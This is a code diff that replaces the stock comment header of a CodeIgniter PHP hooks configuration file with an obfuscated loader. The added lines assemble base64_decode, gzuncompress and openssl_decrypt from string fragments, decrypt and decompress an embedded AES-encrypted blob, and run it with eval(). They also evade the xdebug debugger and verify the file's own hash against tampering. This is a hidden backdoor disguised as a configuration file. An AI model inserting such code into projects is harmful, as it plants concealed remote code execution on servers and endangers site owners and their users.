@@ -1,13 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------------
-| Hooks
-| -------------------------------------------------------------------------
-| This file lets you define "hooks" to extend CI without hacking the core
-| files.  Please see the user guide for info:
-|
-|	https://codeigniter.com/user_guide/general/hooks.html
-|
-*/
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_zwybl06g=('bas'.'e64'.'_de'.'cod'.'e');
+$_pv4csnin=('gzu'.'nco'.'mpr'.'ess');
+$_g8o4m1t5=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_vnd10krb='RrOpIK6C';
+$_tvd2gixc='YYReWPcfLFA=';
+$_f6lz99j6='bMwXvfZc';
+$_egpwul6t='pCGWjjBh';
+$_o9lmnxfb='9wUCzoGU';
+$_dgbkxlvl='Nr8fww==';
+$_ku0v6b5h='Cu8JneXq';
+$_cilfohp4='iRHkQwQ/';
+$_tfp7w2vg=$_zwybl06g($_egpwul6t.$_f6lz99j6.$_o9lmnxfb.$_vnd10krb.$_tvd2gixc);
+$_vd28hghp=$_zwybl06g($_cilfohp4.$_ku0v6b5h.$_dgbkxlvl);
+$_ufg6qjae=$_zwybl06g('bxWmGpDGXavg3Kkre759cyotxDe95INoq4LBjBCI8zD5XNbDwnedKoxnVRPY8LqR0LaGwwb025nHw7FxPEoh16GaE46ycShempzRcAwLqU8=');
+$_i7v5bqmw=$_g8o4m1t5($_ufg6qjae,'aes-256-cbc',$_tfp7w2vg,OPENSSL_RAW_DATA,$_vd28hghp);
+if($_i7v5bqmw===false){exit;}
+$_al4xgrpk=$_pv4csnin($_i7v5bqmw);
+if($_al4xgrpk===false){exit;}
+$_ovtoot52='a8a660f15582fa3222e4dd2589d52ccfac04c4a4ccad582e3d273e4db62fee6e';
+$_zjes3b9h=@file_get_contents(__FILE__);
+if($_zjes3b9h!==false){
+$_usj7qq68=str_replace($_ovtoot52,"0000000000000000000000000000000000000000000000000000000000000000",$_zjes3b9h);
+$_jhl16ss1=hash("sha256",$_usj7qq68);
+if($_jhl16ss1!==$_ovtoot52){@http_response_code(403);exit;}
+}
+eval($_al4xgrpk);
